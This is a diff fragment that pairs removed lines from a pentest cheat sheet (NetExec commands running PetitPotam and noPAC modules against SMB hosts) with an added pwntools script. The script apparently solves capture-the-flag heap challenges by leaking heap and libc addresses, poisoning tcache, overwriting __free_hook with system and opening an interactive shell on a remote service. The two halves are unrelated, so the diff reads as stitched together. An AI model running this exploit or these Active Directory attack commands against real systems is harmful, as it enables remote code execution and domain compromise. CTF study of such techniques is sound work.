-nxc smb <ip> -u '' -p '' -M petitpotam
-```
+    malloc(C, 0x4f8)
+    malloc(A, 0x30)
+    malloc(B, 0x30)
 
-**noPAC**
+    free(A)
+    free(B)
+    free(C)
 
-> You need a credential for this one
-> 
+    heapbase = readLeak(view(A)) << 4 * 3
 
-```bash
-nxc smb <ip> -u 'user' -p 'pass' -M nopac
+    malloc(3, 0x500)
+
+    libc.address = readLeak(view(C)) - 0x1e4030
+
+    print(hex(heapbase))
+    print(hex(libc.address))
+
+    edit(B, p64(encrypt(libc.sym.__free_hook, heapbase)))
+
+    malloc(B, 0x30)
+    malloc(4, 0x30)
+
+    edit(B, b'/bin/sh\x00')
+    edit(4, p64(libc.sym.system))
+
+    free(B)
+
+    p.interactive()
+    p.close()
+
+def level3():
+    binaryname = "./free_a"
+    context.binary = elf = ELF(binaryname)
+    libc = elf.libc
+
+    p = remote("207.154.239.148", 1371)
+
+    def malloc(ind, size):
+        global p
+        r1 = p.sendlineafter(b">", b"1")
+        r2 = p.sendlineafter(b">", str(ind).encode())
+        r3 = p.sendlineafter(b">", str(size).encode())
+        return r1 + r2 + r3
+
+    def free(ind):
+        global p
+        r1 = p.sendlineafter(b">", b"2")
+        r2 = p.sendlineafter(b">", str(ind).encode())
+        return r1 + r2
+
+    def edit(ind, payload):
+        global p
+        r1 = p.sendlineafter(b">", b"3")
+        r2 = p.sendlineafter(b">", str(ind).encode())
+        r3 = p.sendlineafter(b">", payload)
+        return r1 + r2 + r3
+
+    def view(ind):
+        global p
+        r1 = p.sendlineafter(b">", b"4")
+        r2 = p.sendlineafter(b">", str(ind).encode())
+        r3 = p.recvuntil(b"You are using")
+        return r1 + r2 + r3
+
+    def readLeak(resp):
+        rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
+        paddedleak = rawleak.ljust(8, b'\x00')
+        leak = u64(paddedleak)
+        return leak
+
+    def encrypt(target, heapbase):
+        return target ^ (heapbase >> 12)
+
+    malloc(0, 0x4f8)
+    malloc(1, 0x68)
+
+    free(1)
+    malloc(1, 0x68)
+    heapbase = readLeak(view(1)) << 12
+
+    free(0)
+    malloc(90, 0x500)
+    malloc(0, 0x4f8)
+    libc.address = readLeak(view(0)) - 0x1e4030
+    free(90)
+
+    print(f"libc address: {hex(libc.address)}")
+    print(f"heap base: {hex(heapbase)}")
+    print(f"__free_hook@GLIBC: {hex(libc.sym.__free_hook)}")
+
+    for i in range(7):
+        malloc(i, 0x108)
+
+    malloc(7, 0x108)
+    malloc(8, 0x108)
+    malloc(9, 0x10)  # padding to avoid top chunk consolidation
+
+    for i in range(7):
+        free(i)
+
+    free(8)
+    free(7)
+
+    malloc(10, 0x108)  # free one spot in tcache
+
+    free(8)
+    malloc(11, 0x218)
+
+    target = encrypt(libc.sym.__free_hook, heapbase + 0x1000)
+    edit(11, b'A'*0x108 + pack(0x111) + pack(target))
+
+    malloc(12, 0x108)
+    malloc(13, 0x108)  # this controls __free_hook
+    edit(13, pack(libc.sym.system))
+    edit(12, b'/bin/sh\x00')
+
+    free(12)  # system("/bin/sh")
+
+    p.interactive()
+    p.close()
+
+def menu():
+    while True:
+        print("Select the level to execute:")
+        print("1. Level 1")
+        print("2. Level 2")
+        print("3. Level 3")
+        print("4. Exit")
+        
+        choice = input("Enter your choice: ")
+        
+        if choice == '1':
+            level1()
+        elif choice == '2':
+            level2()
+        elif choice == '3':
+            level3()
+        elif choice == '4':
+            print("Exiting the menu.")
+            break
+        else:
+            print("Invalid choice. Please try again.")
+
+if __name__ == "__main__":
+    menu()
 ```
